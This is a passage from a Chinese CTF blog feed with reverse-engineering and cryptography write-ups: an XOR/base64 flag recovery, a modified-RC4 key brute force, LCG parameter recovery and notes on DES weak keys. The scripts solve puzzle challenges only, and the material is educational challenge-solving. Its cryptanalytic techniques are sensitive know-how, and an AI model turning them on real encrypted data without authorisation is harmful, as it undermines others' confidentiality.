alt="image-20240605213108529"></p><p>这里保存了p的前16个值，然后p变成了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0x88</span>, <span class="number">0</span>x8F, <span class="number">0</span>x9B, <span class="number">0</span>xCE, <span class="number">0</span>xD2, <span class="number">0</span>x3C, <span class="number">0</span>x34, <span class="number">0</span>x44, <span class="number">0</span>xE0, <span class="number">0</span>x4D, <span class="number">0</span>xC4, <span class="number">0</span>x45, <span class="number">0</span>x68, <span class="number">0</span>x56, <span class="number">0</span>x7A, <span class="number">0</span>x09, <span class="number">0</span>xC6, <span class="number">0</span>x70, <span class="number">0</span>x65, <span class="number">0</span>x34, <span class="number">0</span>x13, <span class="number">0</span>xF6, <span class="number">0</span>xC4, <span class="number">0</span>xF6, <span class="number">0</span>xFC, <span class="number">0</span>x15, <span class="number">0</span>x6E, <span class="number">0</span>x9C, <span class="number">0</span>xA5, <span class="number">0</span>x0F, <span class="number">0</span>x87, <span class="number">0</span>xCB</span><br></pre></td></tr></table></figure><p>即input加长后的32位，有理由</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">out</span> = [<span class="number">0x6F</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x08</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0x1F</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0xDD</span>, <span class="number">0x7D</span>, <span class="number">0x8D</span>, <span class="number">0xB9</span>, <span class="number">0x88</span>, <span class="number">0x8F</span>, <span class="number">0x9B</span>, <span class="number">0xCE</span>, <span class="number">0xD2</span>, <span class="number">0x3C</span>, <span class="number">0x34</span>, <span class="number">0x44</span>, <span class="number">0xE0</span>, <span class="number">0x4D</span>, <span class="number">0xC4</span>, <span class="number">0x45</span>, <span class="number">0x68</span>, <span class="number">0x56</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0xC6</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x34</span>, <span class="number">0x13</span>, <span class="number">0xF6</span>, <span class="number">0xC4</span>, <span class="number">0xF6</span>, <span class="number">0xFC</span>, <span class="number">0x15</span>, <span class="number">0x6E</span>, <span class="number">0x9C</span>, <span class="number">0xA5</span>, <span class="number">0x0F</span>, <span class="number">0x87</span>, <span class="number">0xCB</span>]</span><br></pre></td></tr></table></figure><p>好好好，我理解了，看了一下CTR的定义，相当于其实是对计数器加密，然后和明文异或</p><p><img src="https://s2.loli.net/2024/06/05/LDPlI3E1UJsMxZK.png" alt="image-20240605225958990"></p><p>然后还是没有发现第三个部分，看了网上的wp才知道有第三段QAQ</p><p>得到了明文</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0xe1</span>,<span class="number">0</span>x41,<span class="number">0</span>xa7,<span class="number">0</span>xff,<span class="number">0</span>x25,<span class="number">0</span>x51,<span class="number">0</span>xa6,<span class="number">0</span>xcc,<span class="number">0</span>x83,<span class="number">0</span>x5f,<span class="number">0</span>x38,<span class="number">0</span>x43,<span class="number">0</span>xbd,<span class="number">0</span>x93,<span class="number">0</span>xcc,<span class="number">0</span>x37,<span class="number">0</span>x67,<span class="number">0</span>xd8,<span class="number">0</span>x8c,<span class="number">0</span>xbc,<span class="number">0</span>x24,<span class="number">0</span>x6e,<span class="number">0</span>x04,<span class="number">0</span>x8d,<span class="number">0</span>xcf,<span class="number">0</span>x79,<span class="number">0</span>xcb,<span class="number">0</span>x6e,<span class="number">0</span>xfe,<span class="number">0</span>xf4,<span class="number">0</span>x45,<span class="number">0</span>xe2,<span class="number">0</span>x12,<span class="number">0</span>xbf,<span class="number">0</span>x16,<span class="number">0</span>x3d,<span class="number">0</span>x3b,<span class="number">0</span>x4a,<span class="number">0</span>xf7,<span class="number">0</span>x77,<span class="number">0</span>x58,<span class="number">0</span>x6f,<span class="number">0</span>x66,<span class="number">0</span>xd4,<span class="number">0</span>xab,<span class="number">0</span>xab,<span class="number">0</span>xb5,<span class="number">0</span>x11,<span class="number">0</span>xd0,<span class="number">0</span>x28,<span class="number">0</span>x5e,<span class="number">0</span>xce,<span class="number">0</span>xcd,<span class="number">0</span>x95,<span class="number">0</span>x9a,<span class="number">0</span>x11,<span class="number">0</span>x9a,<span class="number">0</span>x62,<span class="number">0</span>x27,<span class="number">0</span>xd5,<span class="number">0</span>x71,<span class="number">0</span>x82,<span class="number">0</span>xbe,<span class="number">0</span>x9c</span><br></pre></td></tr></table></figure><p>然后解xxtea</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>啊啊啊啊啊啊啊啊啊啊啊啊啊啊，我谢谢你：)</p><p>解不出来放弃。QWQ</p><h2 id="whereisThel1b"><a href="#whereisThel1b" class="headerlink" title="whereisThel1b"></a>whereisThel1b</h2><p>看佬的blog：</p><p>佬给了两个做法</p><p>硬分析：seed&#x3D;0</p><p>秒</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">encry = [<span class="number">108</span>, <span class="number">117</span>, <span class="number">72</span>, <span class="number">80</span>, <span class="number">64</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">69</span>, <span class="number">115</span>, <span class="number">94</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">115</span>, <span class="number">71</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">56</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">2</span>, <span class="number">84</span>, <span class="number">75</span>, <span class="number">127</span>, <span class="number">68</span>, <span class="number">103</span>,</span><br><span class="line">         <span class="number">85</span>, <span class="number">105</span>, <span class="number">113</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">113</span>, <span class="number">70</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">124</span>, <span class="number">93</span>, <span class="number">120</span>, <span class="number">104</span>, <span class="number">108</span>, <span class="number">106</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">75</span>, <span class="number">93</span>, <span class="number">68</span>, <span class="number">121</span>, <span class="number">26</span>]</span><br><span class="line">lens=<span class="built_in">len</span>(encry)</span><br><span class="line">random.<span class="built_in">seed</span>(<span class="number">0</span>)</span><br><span class="line">rand=[random.<span class="built_in">randint</span>(<span class="number">0</span>,lens) <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="built_in">len</span>(encry))]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(len(encry)):</span></span><br><span class="line"><span class="string">    flag+=chr(rand[i]^encry[i])</span></span><br><span class="line"><span class="string">print(base64.b64decode(flag))</span></span><br></pre></td></tr></table></figure><h1 id="愚者杯2023"><a href="#愚者杯2023" class="headerlink" title="愚者杯2023"></a>愚者杯2023</h1><h2 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h2><p>打开一看，是一个变体rc4，这算是我第一次遇见这种</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> key1_; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> key2_; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp-4h] [ebp-414h]</span></span><br><span class="line">  <span class="type">int</span> key2__; <span class="comment">// [esp+10h] [ebp-400h]</span></span><br><span class="line">  <span class="type">int</span> key1; <span class="comment">// [esp+18h] [ebp-3F8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> key2; <span class="comment">// [esp+1Ch] [ebp-3F4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">1004</span>]; <span class="comment">// [esp+20h] [ebp-3F0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  print(<span class="built_in">std</span>::<span class="built_in">cout</span>, byte_DA31E8);</span><br><span class="line">  <span class="built_in">scanf</span>(input);</span><br><span class="line">  print(<span class="built_in">std</span>::<span class="built_in">cout</span>, byte_DA31F8);</span><br><span class="line">  <span class="built_in">std</span>::istream::operator&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;key1);</span><br><span class="line">  <span class="built_in">std</span>::istream::operator&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;key2);</span><br><span class="line">  key1_ = key1 % <span class="number">299</span>;</span><br><span class="line">  key2_ = key2 % <span class="number">299</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  key2__ = key2 % <span class="number">299</span>;</span><br><span class="line">  len = <span class="built_in">strlen</span>(input);</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = dword_DA3AA0[<span class="number">300</span> * key1_ + key2_] ^ input[i];</span><br><span class="line">      key1_ = (v9 + key1_) % <span class="number">299</span>;</span><br><span class="line">      key2__ = (v9 + key2__) % <span class="number">300</span>;</span><br><span class="line">      v7 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, v9);</span><br><span class="line">      print(v7, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">      key2_ = key2__;</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( i &lt; len );</span><br><span class="line">  &#125;</span><br><span class="line">  print(<span class="built_in">std</span>::<span class="built_in">cout</span>, after);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的dword_DA3AA0是类似S盒的东西，但是有两个key，正常逆是逆不回去的，但是根据异或的性质，如果两个key一样，input和output正好可以相互解密，同时这是一个双射，一一对应，output就是v9的所有值，而key在循环中是加法，所以应当使用从最后到开始反着写，key组合一共只有90000种，而提示有base之后的flag值，由于最后的enc不能base回去，所以猜是先base后encode，flagbase之后是Zmxh，根据这个条件爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">299</span>):</span><br><span class="line">    <span class="keyword">for</span> key2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">299</span>):</span><br><span class="line">        k1 = key1</span><br><span class="line">        k2 = key2</span><br><span class="line">        mid = enc[<span class="built_in">len</span>(enc)-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">            k1 = (k1-enc[i])%<span class="number">299</span></span><br><span class="line">            k2 = (k2-enc[i])%<span class="number">300</span></span><br><span class="line">            mid = table[<span class="number">300</span>*k1+k2]^enc[i]</span><br><span class="line">            out.append(mid)</span><br><span class="line">        out = out[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">bytes</span>(out)[:<span class="number">4</span>]==<span class="string">b&#x27;Zmxh&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(key1)</span><br><span class="line">            <span class="built_in">print</span>(key2)</span><br><span class="line">            <span class="built_in">print</span>(b64decode(<span class="built_in">bytes</span>(out)).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        out = []</span><br></pre></td></tr></table></figure><p>得到key：223和241和</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">flag</span>不在这里呦,</span><br><span class="line">就像生活，</span><br><span class="line">你跨过了人山人海，</span><br><span class="line">你跨过了明月清风，</span><br><span class="line">你见过了三更灯火，</span><br><span class="line">你见过了黎明的城市。</span><br><span class="line"></span><br><span class="line">你觉得你已经足够努力，</span><br><span class="line">你觉得你理应破浪乘风。</span><br><span class="line">你满身疲惫</span><br><span class="line">你筋疲力竭</span><br><span class="line"></span><br><span class="line">可惜，罗马不在前方。</span><br><span class="line">或者，罗马永远在前方，</span><br><span class="line">在别人出生的地方。</span><br><span class="line"></span><br><span class="line">本狸，强烈建议你回到最初的地方</span><br><span class="line">好好研究下加密矩阵</span><br><span class="line">有惊喜哦</span><br></pre></td></tr></table></figure><p>然后看看加密矩阵，不理解，应该是说S盒，但是可以知道这个很长，并且是90000个数，不理解，看wp发现这是一个图片的单通道数据，作为红色</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">single_channel_array = np.array(table, dtype=np.uint8).reshape(<span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line">rgb_array = np.zeros((<span class="number">300</span>, <span class="number">300</span>, <span class="number">3</span>), dtype=np.uint8)</span><br><span class="line">rgb_array[:,:,<span class="number">0</span>] = single_channel_array</span><br><span class="line">img = Image.fromarray(rgb_array, <span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">img.save(<span class="string">&#x27;output_image.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后flag在图片中</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ctfshow</span>&#123;d244daeb-<span class="number">7182</span>-<span class="number">4</span>c98-bec6-<span class="number">0</span>c99329ab71f&#125;</span><br></pre></td></tr></table></figure><p>这真不是misc，不过下次应该就能想到了</p><hr><p>CISCN好难啊啊啊啊</p><p>裂开</p><p>QAQ</p><p>不管了，还有好多东西没写</p>]]></content>
    
    
    <summary type="html">再记录一下做的题</summary>
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    
    <category term="RE" scheme="https://www.pri87.vip/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>unicorn-模拟执行</title>
    <link href="https://www.pri87.vip/posts/2d7b033c.html"/>
    <id>https://www.pri87.vip/posts/2d7b033c.html</id>
    <published>2024-06-02T08:19:13.000Z</published>
    <updated>2024-06-17T16:20:30.400Z</updated>
    
    <content type="html"><![CDATA[<p>之前打DASCTF遇到了一个平坦化的题目，但是正好D-810和网上的脚本都失效了，所以准备自己研究一下，然后发现很多网上的帖子都指向了Unicorn，所以不得不学一下这个工具。</p><p>路：</p><p>[<a href="https://bbs.kanxue.com/thread-224330.htm#msg_header_h3_2">翻译]Unicorn引擎教程-外文翻译-看雪-安全社区|安全招聘|kanxue.com</a></p><p>[<a href="https://bbs.kanxue.com/thread-252321.htm">原创]ARM64 OLLVM反混淆-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://www.cnblogs.com/Only-xiaoxiao/p/17316343.html">unicorn 入门学习 - Only-xiaoxiao - 博客园 (cnblogs.com)</a></p><p>[<a href="https://bbs.kanxue.com/thread-275296.htm">原创]2022祥云杯CTF babyparser-CTF对抗-看雪-安全社区|安全招聘|kanxue.com</a></p>]]></content>
    
    
    <summary type="html">一篇入门笔记</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    
    <category term="模拟执行" scheme="https://www.pri87.vip/tags/%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C/"/>
    
    <category term="平坦化" scheme="https://www.pri87.vip/tags/%E5%B9%B3%E5%9D%A6%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>DRKCTF-复现</title>
    <link href="https://www.pri87.vip/posts/5213c585.html"/>
    <id>https://www.pri87.vip/posts/5213c585.html</id>
    <published>2024-05-27T03:55:48.000Z</published>
    <updated>2024-06-17T16:24:53.348Z</updated>
    
    <content type="html"><![CDATA[<p>我们开展的DRKCTF！</p><p>没打，而且好难，所以跟着wp把它复现出来</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="密码-sinin"><a href="#密码-sinin" class="headerlink" title="密码_sinin"></a>密码_sinin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = <span class="string">b&#x27;flag&#123;********&#125;&#x27;</span></span><br><span class="line">a =  getPrime(<span class="number">247</span>)</span><br><span class="line">b =  getPrime(<span class="number">247</span>)</span><br><span class="line">n =  getPrime(<span class="number">247</span>)</span><br><span class="line"></span><br><span class="line">seed = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed, a, b, m</span>):</span><br><span class="line">        self.seed = seed  </span><br><span class="line">        self.a = a  </span><br><span class="line">        self.b = b  </span><br><span class="line">        self.m = m  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line"></span><br><span class="line">seed = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">output = LCG(seed,a,b,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(getPrime(<span class="number">16</span>)):</span><br><span class="line">    output.generate()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">5944442525761903973219225838876172353829065175803203250803344015146870499</span></span><br><span class="line"><span class="string">141002272698398325287408425994092371191022957387708398440724215884974524650</span></span><br><span class="line"><span class="string">42216026849704835847606250691811468183437263898865832489347515649912153042</span></span><br><span class="line"><span class="string">67696624031762373831757634064133996220332196053248058707361437259689848885</span></span><br><span class="line"><span class="string">19724224939085795542564952999993739673429585489399516522926780014664745253</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这个是LCG线性同余随机数生成器</p><p>原理是<a href="https://zer0yu.github.io/2018/11/02/Cracking-LCG/">攻击线性同余生成器(LCG) (zer0yu.github.io)</a></p><p>过程：</p><ol><li>求m</li><li>求a</li><li>求b</li><li>求seed</li></ol><p>这里由于是间隔一个来给X，所以求到$a^2$之后不好求a，太大了，所以要以$a^2$作为新的a，$(a+1)b$作为新的b</p><p>求到后就可以穷举2的16次方爆flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gy</span><br><span class="line">x0 = <span class="number">5944442525761903973219225838876172353829065175803203250803344015146870499</span></span><br><span class="line">x1 = <span class="number">141002272698398325287408425994092371191022957387708398440724215884974524650</span></span><br><span class="line">x2 = <span class="number">42216026849704835847606250691811468183437263898865832489347515649912153042</span></span><br><span class="line">x3 = <span class="number">67696624031762373831757634064133996220332196053248058707361437259689848885</span></span><br><span class="line">x4 = <span class="number">19724224939085795542564952999993739673429585489399516522926780014664745253</span></span><br><span class="line"></span><br><span class="line">d0 = x1 - x0</span><br><span class="line">d1 = x2 - x1</span><br><span class="line">d2 = x3 - x2</span><br><span class="line">d3 = x4 - x3</span><br><span class="line"></span><br><span class="line">k1 = d2*d0 - d1*d1</span><br><span class="line">k2 = d3*d0 - d1*d2</span><br><span class="line">m = math.gcd(k1,k2)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">inv_d0 = gy.invert(d0,m)</span><br><span class="line">pa = d1*inv_d0 % m</span><br><span class="line"><span class="built_in">print</span>(pa)</span><br><span class="line"></span><br><span class="line">b = x1 - pa*x0 % m</span><br><span class="line">inv_a = gy.invert(pa,m)</span><br><span class="line">seed = inv_a * (x0-b)%m</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">    seed = inv_a * (seed-b)% m</span><br><span class="line">    flag = long_to_bytes(seed)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"> <span class="comment">#b&#x27;flag&#123;Hello_CTF&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>还有第二种方法</p><p>Grobner基求解多项式多个根，但是不会，给个D神的链接QAQ</p><p><a href="https://dexterjie.github.io/2023/07/05/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81-LCG/">LCG | DexterJie’Blog</a></p><h3 id="EzDES"><a href="#EzDES" class="headerlink" title="EzDES"></a>EzDES</h3><p>一开始没想到QAQ</p><p><a href="https://lightless.me/archives/DES-Weak-Keys.html">DES 弱密钥 - lightless blog</a>看看佬的blog</p><blockquote><p>有四个弱密钥是绝对不能使用的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\x01\x01\x01\x01\x01\x01\x01\x01</span><br><span class="line">\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE</span><br><span class="line">\xE0\xE0\xE0\xE0\xF1\xF1\xF1\xF1</span><br><span class="line">\x1F\x1F\x1F\x1F\x0E\x0E\x0E\x0E</span><br></pre></td></tr></table></figure><p>如果不考虑校验位的密钥，下面几个也是属于弱密钥的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\x00\x00\x00\x00\x00\x00\x00\x00</span><br><span class="line">\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF</span><br><span class="line">\xE1\xE1\xE1\xE1\xF0\xF0\xF0\xF0</span><br><span class="line">\x1E\x1E\x1E\x1E\x0F\x0F\x0F\x0F</span><br></pre></td></tr></table></figure><p>如果使用弱密钥，PC1 计算的结果会导致轮密钥全部为 0，全部为 1 或全部 01 交替。<br>因为所有的轮密钥都是一样的，并且 DES 是 Feistel 网络的结构，这就导致加密函数是自反相 (self-inverting) 的，结果就是加密一次看起来没什么问题，但是如果再加密一次就得到了明文。</p></blockquote><blockquote><h2 id="部分弱密钥"><a href="#部分弱密钥" class="headerlink" title="部分弱密钥"></a>部分弱密钥</h2><p>部分弱密钥是指只会在计算过程中产生两个不同的子密钥，每一个在加密的过程中使用 8 次。这就意味着这对密钥 K1 和 K2 有如下性质：<br><img src="https://upload.wikimedia.org/math/0/e/c/0ec16658b1f5ae9031cb4993692794dc.png" alt="部分弱密钥性质"></p><p>6 个常见的部分弱密钥对</p><ul><li>0x011F011F010E010E and 0x1F011F010E010E01</li><li>0x01E001E001F101F1 and 0xE001E001F101F101</li><li>0x01FE01FE01FE01FE and 0xFE01FE01FE01FE01</li><li>0x1FE01FE00EF10EF1 and 0xE01FE01FF10EF10E</li><li>0x1FFE1FFE0EFE0EFE and 0xFE1FFE1FFE0EFE0E</li><li>0xE0FEE0FEF1FEF1FE and 0xFEE0FEE0FEF1FEF1</li></ul><p>OpenSSL 中对弱密钥的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">119</span> <span class="type">static</span> <span class="type">const</span> DES_cblock weak_keys[NUM_WEAK_KEY]=&#123;</span><br><span class="line"><span class="number">120</span>     <span class="comment">/* weak keys */</span></span><br><span class="line"><span class="number">121</span>     &#123;<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">122</span>     &#123;<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span 